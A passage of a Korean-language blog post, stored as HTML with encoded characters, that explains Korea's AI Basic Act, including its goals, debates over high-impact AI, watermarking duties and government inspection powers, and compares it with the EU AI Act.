&#xBC1B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="3-AI-&#xAE30;&#xBCF8;&#xBC95;&#xC758;-&#xC8FC;&#xC694;-&#xBAA9;&#xC801;"><a href="#3-AI-&#xAE30;&#xBCF8;&#xBC95;&#xC758;-&#xC8FC;&#xC694;-&#xBAA9;&#xC801;" class="headerlink" title="3. AI &#xAE30;&#xBCF8;&#xBC95;&#xC758; &#xC8FC;&#xC694; &#xBAA9;&#xC801;"></a>3. AI &#xAE30;&#xBCF8;&#xBC95;&#xC758; &#xC8FC;&#xC694; &#xBAA9;&#xC801;</h2><p>&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;&#xC740; &#xD06C;&#xAC8C; &#xB450; &#xAC00;&#xC9C0; &#xC8FC;&#xC694; &#xBAA9;&#xC801;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB;&#xC9F8;, <strong>AI &#xAE30;&#xC220; &#xBC0F; &#xAD00;&#xB828; &#xC0B0;&#xC5C5; &#xC9C4;&#xD765;</strong>&#xC744; &#xC704;&#xD574; &#xC815;&#xBD80; &#xCC28;&#xC6D0;&#xC758; &#xC9C0;&#xC6D0; &#xCCB4;&#xACC4;&#xB97C; &#xC218;&#xB9BD;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80; &#xC7A5;&#xAD00;&#xC740; 3&#xB144;&#xB9C8;&#xB2E4; AI &#xAE30;&#xC220; &#xBC1C;&#xC804;&#xC744; &#xC704;&#xD55C; &#xAE30;&#xBCF8; &#xACC4;&#xD68D;&#xC744; &#xC218;&#xB9BD;&#xD558;&#xACE0;, &#xC911;&#xC18C;&#xAE30;&#xC5C5;&#xACFC; &#xCC3D;&#xC5C5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xBA70;, AI &#xB370;&#xC774;&#xD130; &#xC13C;&#xD130; &#xAD6C;&#xCD95;&#xACFC; &#xC6B4;&#xC601; &#xB4F1;&#xC744; &#xD1B5;&#xD574; &#xC0B0;&#xC5C5; &#xBC1C;&#xC804;&#xC744; &#xB3D5;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB458;&#xC9F8;, <strong>&#xACE0;&#xC601;&#xD5A5; AI</strong>&#xC640; <strong>&#xC0DD;&#xC131;&#xD615; AI</strong>&#xB97C; &#xD3EC;&#xD568;&#xD55C; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB300;&#xD55C; &#xADDC;&#xC81C;&#xB97C; &#xAC15;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xACE0;&#xC601;&#xD5A5; AI&#xB294; &#xC0DD;&#xBA85;, &#xC2E0;&#xCCB4;, &#xC7AC;&#xC0B0;, &#xAE30;&#xBCF8;&#xAD8C;&#xC5D0; &#xC2EC;&#xAC01;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC73C;&#xB85C;, &#xC8FC;&#xB85C; <strong>&#xC5D0;&#xB108;&#xC9C0;, &#xC758;&#xB8CC;, &#xAD50;&#xD1B5;, &#xB300;&#xCD9C;</strong> &#xC0B0;&#xC5C5;&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC6B4;&#xC601;&#xD558;&#xB294; &#xC0AC;&#xC5C5;&#xC790;&#xB294; &#xD22C;&#xBA85;&#xC131;, &#xC548;&#xC804;&#xC131;, &#xC704;&#xD5D8; &#xAD00;&#xB9AC; &#xBC29;&#xC548;&#xC744; &#xB9C8;&#xB828;&#xD574;&#xC57C; &#xD558;&#xBA70;, &#xC774;&#xB97C; &#xC704;&#xBC18;&#xD560; &#xACBD;&#xC6B0; &#xACFC;&#xD0DC;&#xB8CC; &#xB4F1;&#xC758; &#xCC98;&#xBC8C;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="4-&#xC8FC;&#xC694;-&#xC7C1;&#xC810;&#xACFC;-&#xB17C;&#xB780;"><a href="#4-&#xC8FC;&#xC694;-&#xC7C1;&#xC810;&#xACFC;-&#xB17C;&#xB780;" class="headerlink" title="4. &#xC8FC;&#xC694; &#xC7C1;&#xC810;&#xACFC; &#xB17C;&#xB780;"></a>4. &#xC8FC;&#xC694; &#xC7C1;&#xC810;&#xACFC; &#xB17C;&#xB780;</h2><p><img src="/2025/05/16/romi0x/ai_act_ko/image2.png" alt="[https://zdnet.co.kr/view/?no=20241226170834](https://zdnet.co.kr/view/?no=20241226170834)"></p><p><a href="https://zdnet.co.kr/view/?no=20241226170834">https://zdnet.co.kr/view/?no=20241226170834</a></p><p>AI &#xAE30;&#xBCF8;&#xBC95; &#xC2DC;&#xD589;&#xB839; &#xAD00;&#xB828; &#xD575;&#xC2EC; &#xC7C1;&#xC810;&#xC740; &#x2460;&#xACE0;&#xC601;&#xD5A5; AI&#xC758; &#xC815;&#xC758; &#x2461;&#xC6CC;&#xD130;&#xB9C8;&#xD06C; &#xD45C;&#xC2DC; &#xC758;&#xBB34;&#xD654; &#x2462;&#xC815;&#xBD80;&#xC758; &#xC870;&#xC0AC; &#xAD8C;&#xD55C;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="1-&#xACE0;&#xC601;&#xD5A5;-AI&#xC758;-&#xC815;&#xC758;"><a href="#1-&#xACE0;&#xC601;&#xD5A5;-AI&#xC758;-&#xC815;&#xC758;" class="headerlink" title="1) &#xACE0;&#xC601;&#xD5A5; AI&#xC758; &#xC815;&#xC758;"></a>1) &#xACE0;&#xC601;&#xD5A5; AI&#xC758; &#xC815;&#xC758;</h3><p><img src="/2025/05/16/romi0x/ai_act_ko/image3.png" alt="image.png"></p><ul><li>&#xACE0;&#xC601;&#xD5A5; &#xC778;&#xACF5;&#xC9C0;&#xB2A5;: &#xC0DD;&#xBA85;, &#xC2E0;&#xCCB4;, &#xC7AC;&#xC0B0;, &#xAE30;&#xBCF8;&#xAD8C; &#xB4F1;&#xC5D0; &#xC2EC;&#xAC01;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xB294; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC2DC;&#xC2A4;&#xD15C;</li><li>&#xC0DD;&#xC131;&#xD615; &#xC778;&#xACF5;&#xC9C0;&#xB2A5;: &#xD14D;&#xC2A4;&#xD2B8;, &#xC774;&#xBBF8;&#xC9C0; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xACB0;&#xACFC;&#xBB3C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC2DC;&#xC2A4;&#xD15C;</li><li>&#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC0B0;&#xC5C5;: &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xAE30;&#xC220; &#xB610;&#xB294; &#xAD00;&#xB828; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC0B0;&#xC5C5; &#xC804;&#xBC18;</li><li>&#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC0AC;&#xC5C5;&#xC790;: &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC0B0;&#xC5C5;&#xC5D0; &#xC885;&#xC0AC;&#xD558;&#xB294; &#xBC95;&#xC778;, &#xAC1C;&#xC778;, &#xAE30;&#xAD00; &#xB4F1; &#xC8FC;&#xCCB4;</li></ul><p>AI &#xAE30;&#xBCF8;&#xBC95;&#xC5D0;&#xC11C; &#xADDC;&#xC815;&#xD55C; <strong>&#xACE0;&#xC601;&#xD5A5; AI</strong>&#xC758; &#xC815;&#xC758;&#xB294; &#xB2E4;&#xC18C; &#xBAA8;&#xD638;&#xD558;&#xB2E4;&#xB294; &#xC9C0;&#xC801;&#xC744; &#xBC1B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACE0;&#xC601;&#xD5A5; AI&#xB294; &#xC8FC;&#xB85C; <strong>&#xC5D0;&#xB108;&#xC9C0;, &#xC758;&#xB8CC;, &#xAD50;&#xD1B5;, &#xB300;&#xCD9C;</strong> &#xB4F1; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xB294; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5A4; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xC774;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD574; &#xAD6C;&#xCCB4;&#xC801;&#xC778; &#xAE30;&#xC900;&#xC774; &#xBD80;&#xC871;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, AI&#xAC00; &#xC2E0;&#xC6A9; &#xC810;&#xC218; &#xC0B0;&#xCD9C;&#xC5D0;&#xB9CC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xACBD;&#xC6B0;, &#xB300;&#xCD9C; &#xC0B0;&#xC5C5;&#xC5D0;&#xC11C;&#xB3C4; &#xC774;&#xB97C; &#xACE0;&#xC601;&#xD5A5; AI&#xB85C; &#xBD84;&#xB958;&#xD560;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xB17C;&#xB780;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xBD80; &#xAE30;&#xC5C5;&#xB4E4;&#xC740; &#xACE0;&#xC601;&#xD5A5; AI&#xB97C; <strong>&#xC0AC;&#xC6A9; &#xBC29;&#xC2DD;</strong>&#xC5D0; &#xB530;&#xB77C; &#xAD6C;&#xBD84;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xACE0; &#xC8FC;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-&#xC6CC;&#xD130;&#xB9C8;&#xD06C;-&#xD45C;&#xC2DC;-&#xC758;&#xBB34;&#xD654;"><a href="#2-&#xC6CC;&#xD130;&#xB9C8;&#xD06C;-&#xD45C;&#xC2DC;-&#xC758;&#xBB34;&#xD654;" class="headerlink" title="2) &#xC6CC;&#xD130;&#xB9C8;&#xD06C; &#xD45C;&#xC2DC; &#xC758;&#xBB34;&#xD654;"></a>2) &#xC6CC;&#xD130;&#xB9C8;&#xD06C; &#xD45C;&#xC2DC; &#xC758;&#xBB34;&#xD654;</h3><ul><li><strong>&#xD22C;&#xBA85;&#xC131; &#xD655;&#xBCF4; &#xC758;&#xBB34; (&#xC81C;31&#xC870;)</strong><ul><li>&#xACE0;&#xC601;&#xD5A5; &#xB610;&#xB294; &#xC0DD;&#xC131;&#xD615; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC81C;&#xD488;&#xC774;&#xB098; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD560; &#xACBD;&#xC6B0;, &#xD574;&#xB2F9; &#xC0AC;&#xC2E4;&#xC744; &#xC774;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC0AC;&#xC804;&#xC5D0; &#xBA85;&#xD655;&#xD788; &#xACE0;&#xC9C0;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC0DD;&#xC131;&#xD615; AI&#xAC00; &#xC0DD;&#xC131;&#xD55C; &#xACB0;&#xACFC;&#xBB3C;&#xC784;&#xC744; &#xBA85;&#xC2DC;&#xD574;&#xC57C; &#xD558;&#xBA70;, &#xD604;&#xC2E4;&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xAC00;&#xC0C1; &#xACB0;&#xACFC;&#xBB3C;&#xC744; &#xC81C;&#xACF5;&#xD560; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC778;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xACE0;&#xC9C0; &#xB610;&#xB294; &#xD45C;&#xC2DC;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xBC18;&#xD560; &#xACBD;&#xC6B0; 3&#xCC9C;&#xB9CC; &#xC6D0; &#xC774;&#xD558;&#xC758; &#xACFC;&#xD0DC;&#xB8CC;&#xAC00; &#xBD80;&#xACFC;&#xB41C;&#xB2E4;.</li></ul></li><li><strong>&#xC548;&#xC804;&#xC131; &#xD655;&#xBCF4; &#xC758;&#xBB34; (&#xC81C;32&#xC870;)</strong><ul><li>AI &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xAC1C;&#xBC1C;&#xBD80;&#xD130; &#xD65C;&#xC6A9;, &#xD3D0;&#xAE30;&#xAE4C;&#xC9C0; &#xC804; &#xC0DD;&#xC560;&#xC8FC;&#xAE30;&#xC5D0; &#xAC78;&#xCE5C; &#xC704;&#xD5D8;&#xC744; &#xC0AC;&#xC804; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xD3C9;&#xAC00;&#xD558;&#xC5EC; &#xC644;&#xD654; &#xB300;&#xCC45;&#xC744; &#xB9C8;&#xB828;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC77C;&#xC815; &#xAE30;&#xC900; &#xC774;&#xC0C1;&#xC758; &#xC5F0;&#xC0B0;&#xB7C9;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xAC15;&#xD654;&#xB41C; &#xC548;&#xC804;&#xC131; &#xAE30;&#xC900;&#xC774; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;. &#xC704;&#xD5D8; &#xBC1C;&#xC0DD; &#xC2DC; &#xB300;&#xC751; &#xCCB4;&#xACC4; &#xAD6C;&#xCD95; &#xBC0F; &#xC9C0;&#xC18D;&#xC801;&#xC778; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xCCB4;&#xACC4; &#xD655;&#xBCF4;&#xAC00; &#xD544;&#xC218;&#xC774;&#xBA70;, &#xC774;&#xD589; &#xACB0;&#xACFC;&#xB294; &#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80;&#xC7A5;&#xAD00;&#xC5D0;&#xAC8C; &#xC815;&#xAE30; &#xBCF4;&#xACE0;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</li></ul></li></ul><p>AI&#xAC00; &#xC601;&#xD654;, &#xC6F9;&#xD230;, &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xB4F1;&#xC758; &#xC81C;&#xC791;&#xC5D0; &#xD65C;&#xC6A9;&#xB420; &#xB54C; <strong>&#xC6CC;&#xD130;&#xB9C8;&#xD06C; &#xD45C;&#xC2DC; &#xC758;&#xBB34;&#xD654;</strong>&#xAC00; &#xCC3D;&#xC791; &#xD65C;&#xB3D9;&#xC5D0; &#xBD80;&#xC815;&#xC801;&#xC778; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC9C0;&#xC801;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. AI&#xAC00; &#xBC30;&#xACBD; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB4F1; &#xBCF4;&#xC870; &#xB3C4;&#xAD6C;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xB54C;, &#xC6CC;&#xD130;&#xB9C8;&#xD06C;&#xB97C; &#xC77C;&#xC77C;&#xC774; &#xBD80;&#xCC29;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xBA74; &#xCF58;&#xD150;&#xCE20; &#xD488;&#xC9C8;&#xACFC; &#xCC3D;&#xC791; &#xC790;&#xC720;&#xB97C; &#xC800;&#xD558;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC6B0;&#xB824;&#xAC00; &#xC81C;&#xAE30;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-&#xC815;&#xBD80;&#xC758;-&#xC870;&#xC0AC;-&#xAD8C;&#xD55C;"><a href="#3-&#xC815;&#xBD80;&#xC758;-&#xC870;&#xC0AC;-&#xAD8C;&#xD55C;" class="headerlink" title="3) &#xC815;&#xBD80;&#xC758; &#xC870;&#xC0AC; &#xAD8C;&#xD55C;"></a>3) &#xC815;&#xBD80;&#xC758; &#xC870;&#xC0AC; &#xAD8C;&#xD55C;</h3><p>AI &#xAE30;&#xBCF8;&#xBC95;&#xC740; &#xC815;&#xBD80;&#xC5D0;&#xAC8C; &#xACE0;&#xC601;&#xD5A5; AI &#xC0AC;&#xC5C5;&#xC744; &#xC0AC;&#xC804; &#xAC80;&#xD1A0;&#xD558;&#xAC70;&#xB098; &#xC778;&#xC99D;&#xD560; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <strong>&#xAC1C;&#xC778; &#xC815;&#xBCF4; &#xC720;&#xCD9C;</strong>&#xC774;&#xB098; <strong>&#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548; &#xC704;&#xD611;</strong> &#xB4F1;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC6B0;&#xB824;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACFC;&#xB3C4;&#xD55C; &#xC0AC;&#xC2E4; &#xC870;&#xC0AC;&#xB098; &#xAC80;&#xC99D;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xAE30;&#xC900;&#xC744; &#xB9C8;&#xB828;&#xD560; &#xD544;&#xC694;&#xC131;&#xC774; &#xC81C;&#xAE30;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="5-EU-AI&#xBC95;&#xACFC;&#xC758;-&#xBE44;&#xAD50;"><a href="#5-EU-AI&#xBC95;&#xACFC;&#xC758;-&#xBE44;&#xAD50;" class="headerlink" title="5. EU AI&#xBC95;&#xACFC;&#xC758; &#xBE44;&#xAD50;"></a>5. EU AI&#xBC95;&#xACFC;&#xC758; &#xBE44;&#xAD50;</h2><p>AI &#xAE30;&#xBCF8;&#xBC95;&#xACFC; <strong>EU AI&#xBC95;</strong>&#xC740; &#xADDC;&#xC81C; &#xB300;&#xC0C1;, &#xBC94;&#xC704;, &#xC81C;&#xC7AC; &#xBC29;&#xC2DD;&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xB97C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. EU AI&#xBC95;&#xC740; AI&#xB97C; &#xC704;&#xD5D8;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; <strong>4&#xAC00;&#xC9C0; &#xC720;&#xD615;</strong>&#xC73C;&#xB85C; &#xBD84;&#xB958;&#xD558;&#xC5EC; &#xC138;&#xBD84;&#xD654;&#xB41C; &#xADDC;&#xC81C;&#xB97C; &#xC801;&#xC6A9;&#xD558;&#xB294; &#xBC18;&#xBA74;, &#xD55C;&#xAD6D;&#xC758; AI &#xAE30;&#xBCF8;&#xBC95;&#xC740; <strong>&#xACE0;&#xC601;&#xD5A5; AI</strong>&#xC640; <strong>&#xC0DD;&#xC131;&#xD615; AI</strong>&#xC5D0;&#xB9CC; &#xADDC;&#xC81C;&#xB97C; &#xB450;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; EU AI&#xBC95;&#xC740; &#xD6E8;&#xC52C; &#xB354; &#xC5C4;&#xACA9;&#xD55C; &#xCC98;&#xBC8C;&#xC744; &#xADDC;&#xC815;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xC81C;&#xC7AC;&#xAC00; <strong>&#xC804; &#xC138;&#xACC4; &#xB9E4;&#xCD9C;&#xC758; &#xCD5C;&#xB300; 7%</strong>&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xACFC;&#xC9D5;&#xAE08; &#xBD80;&#xACFC;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>&#xD56D;&#xBAA9;</th><th>EU AI&#xBC95;</th><th>K-AI&#xBC95;</th></tr></thead><tbody><tr><td><strong>&#xC81C;&#xC815; &#xBAA9;&#xC801;</strong></td><td>&#xC778;&#xAC04; &#xC911;&#xC2EC;, &#xAE30;&#xBCF8;&#xAD8C; &#xBCF4;&#xD638;, &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; AI &#xD655;&#xC0B0;</td><td>AI &#xAE30;&#xC220; &#xBC0F; &#xC0B0;&#xC5C5; &#xC9C4;&#xD765;, &#xAE00;&#xB85C;&#xBC8C; &#xACBD;&#xC7C1;&#xB825; &#xD655;&#xBCF4;</td></tr><tr><td><strong>&#xC785;&#xBC95; &#xCCA0;&#xD559;</strong></td><td><strong>&#xC704;&#xD5D8; &#xAE30;&#xBC18; &#xC811;&#xADFC;(Risk-based approach)</strong>, &#xC0AC;&#xC804; &#xADDC;&#xC81C; &#xC911;&#xC2EC;</td><td><strong>&#xC9C4;&#xD765; &#xC6B0;&#xC120; &#xC811;&#xADFC;</strong>, &#xC720;&#xC5F0;&#xD55C; &#xADDC;&#xC81C; &#xAD6C;&#xC870;</td></tr></tbody></table></div><p>EU&#xB294; <strong>&#xAE30;&#xBCF8;&#xAD8C; &#xBCF4;&#xD638;</strong>&#xC640; <strong>&#xC2DC;&#xC7A5; &#xD1B5;&#xD569;</strong>, <strong>&#xAE30;&#xC220; &#xC2E0;&#xB8B0;&#xC131; &#xD655;&#xBCF4;</strong>&#xB97C; &#xC8FC;&#xC694; &#xBAA9;&#xD45C;&#xB85C; &#xC0BC;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xAE30;&#xC220;&#xC758; &#xC704;&#xD5D8;&#xB3C4;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xADDC;&#xC81C;&#xB97C; &#xCC28;&#xB4F1; &#xC801;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xBC18;&#xBA74; K-AI&#xBC95;&#xC740; AI &#xC0B0;&#xC5C5;&#xC758; <strong>&#xC131;&#xC7A5; &#xC7A0;&#xC7AC;&#xB825;</strong>&#xC5D0; &#xC8FC;&#xBAA9;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;, <strong>&#xAE30;&#xC220; &#xAC1C;&#xBC1C;&#xACFC; &#xC0DD;&#xD0DC;&#xACC4; &#xD65C;&#xC131;&#xD654;</strong>&#xC5D0; &#xBC29;&#xC810;&#xC744; &#xB454; &#xC720;&#xC5F0;&#xD55C; &#xADDC;&#xC81C; &#xAD6C;&#xC870;&#xB97C; &#xCD94;&#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>EU AI&#xBC95;: &#xD3EC;&#xAD04;&#xC801;&#xB7;&#xC815;&#xAD50;&#xD55C; &#xBD84;&#xB958;&#xCCB4;&#xACC4;</strong><ul><li>AI &#xC2DC;&#xC2A4;&#xD15C;&#xC744; <strong>4&#xB2E8;&#xACC4; &#xC704;&#xD5D8; &#xC218;&#xC900;</strong>(&#xAE08;&#xC9C0;, &#xACE0;&#xC704;&#xD5D8;, &#xC81C;&#xD55C;&#xC801; &#xC704;&#xD5D8;, &#xCD5C;&#xC18C; &#xC704;&#xD5D8;)&#xC73C;&#xB85C; &#xBD84;&#xB958;</li><li>&#xACE0;&#xC704;&#xD5D8; AI&#xB294; <strong>&#xC0AC;&#xC804; &#xC801;&#xD569;&#xC131; &#xD3C9;&#xAC00;</strong>, <strong>&#xAE30;&#xC220;&#xBB38;&#xC11C;&#xD654;</strong>, <strong>&#xB85C;&#xADF8; &#xBCF4;&#xAD00;</strong>, <strong>&#xC778;&#xAC04; &#xAC10;&#xB3C5; &#xC758;&#xBB34; &#xB4F1;</strong>&#xC744; &#xAC16;&#xCDB0;&#xC57C; &#xD568;</li><li>&#xC608;: &#xC6D0;&#xACA9; &#xC0DD;&#xCCB4;&#xC778;&#xC2DD;, &#xD559;&#xC0DD;&#xB7;&#xADFC;&#xB85C;&#xC790; &#xAC10;&#xC2DC;, &#xC2E0;&#xC6A9;&#xD3C9;&#xAC00;, &#xBCF4;&#xD5D8; &#xAC00;&#xACA9; &#xCC45;&#xC815; &#xC2DC;&#xC2A4;&#xD15C; &#xB4F1;</li></ul></li><li><strong>K-AI&#xBC95;: &#xACE0;&#xC601;&#xD5A5;&#xB7;&#xC0DD;&#xC131;&#xD615; AI &#xC911;&#xC2EC;</strong><ul><li>&#x2018;&#xACE0;&#xC601;&#xD5A5; AI&#x2019;, &#x2018;&#xC0DD;&#xC131;&#xD615; AI&#x2019;&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xB418; &#xAD6C;&#xCCB4;&#xC801; &#xC815;&#xC758;&#xB294; &#xBAA8;&#xD638;&#xD568;</li><li>&#xADDC;&#xC81C;&#xBCF4;&#xB2E4;&#xB294; &#xAC00;&#xC774;&#xB4DC;&#xB77C;&#xC778;&#xACFC; &#xC2DC;&#xD589;&#xB839; &#xC911;&#xC2EC;&#xC758; <strong>&#xC790;&#xC728;&#xC801;&#xB7;&#xC720;&#xC5F0;&#xD55C; &#xC801;&#xC6A9;</strong> &#xCD94;&#xAD6C;</li></ul></li></ul><h2 id="6-&#xD5A5;&#xD6C4;-&#xACFC;&#xC81C;&#xC640;-&#xC758;&#xACAC;-&#xC81C;&#xC2DC;-&#xD544;&#xC694;&#xC131;"><a href="#6-&#xD5A5;&#xD6C4;-&#xACFC;&#xC81C;&#xC640;-&#xC758;&#xACAC;-&#xC81C;&#xC2DC;-&#xD544;&#xC694;&#xC131;" class="headerlink" title="6. &#xD5A5;&#xD6C4; &#xACFC;&#xC81C;&#xC640; &#xC758;&#xACAC; &#xC81C;&#xC2DC; &#xD544;&#xC694;&#xC131;"></a>6. &#xD5A5;&#xD6C4; &#xACFC;&#xC81C;&#xC640; &#xC758;&#xACAC; &#xC81C;&#xC2DC; &#xD544;&#xC694;&#xC131;</h2><p>AI &#xAE30;&#xBCF8;&#xBC95;&#xC5D0; &#xB300;&#xD55C; &#xD3C9;&#xAC00;&#xB294; &#xAE0D;&#xC815;&#xACFC; &#xC6B0;&#xB824;&#xAC00; &#xACF5;&#xC874;&#xD569;&#xB2C8;&#xB2E4;. AI &#xAE30;&#xC220;&#xACFC; &#xC0B0;&#xC5C5;&#xC744; &#xC9C4;&#xD765;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD55C; &#xBC95;&#xC801; &#xAE30;&#xBC18;&#xC744; &#xB9C8;&#xB828;&#xD588;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C;&#xB294; &#xC758;&#xBBF8;&#xAC00; &#xC788;&#xC9C0;&#xB9CC;, &#xACE0;&#xC704;&#xD5D8; AI&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xC758;&#xAC00; &#xBD88;&#xBA85;&#xD655;&#xD558;&#xACE0; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBC0F; &#xC800;&#xC791;&#xAD8C; &#xBCF4;&#xD638; &#xB4F1; &#xC911;&#xC694;&#xD55C; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xBBF8;&#xBE44;&#xD558;&#xB2E4;&#xB294; &#xBE44;&#xD310;&#xB3C4; &#xC81C;&#xAE30;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xB530;&#xB77C; &#xAD00;&#xB828; &#xC0AC;&#xC5C5;&#xC790;&#xB4E4;&#xC774; &#xC2DC;&#xD589;&#xB839;&#xACFC; &#xAC00;&#xC774;&#xB4DC;&#xB77C;&#xC778; &#xC81C;&#xC815; &#xACFC;&#xC815;&#xC5D0; &#xC801;&#xADF9; &#xCC38;&#xC5EC;&#xD574; &#xBC95;&#xC758; &#xAD6C;&#xCCB4;&#xC801;&#xC778; &#xB0B4;&#xC6A9;&#xC744; &#xBCF4;&#xC644;&#xD574; &#xB098;&#xAC00;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD544;&#xC790;&#xB294; &#xAE30;&#xC220; &#xBC1C;&#xC804;&#xC758; 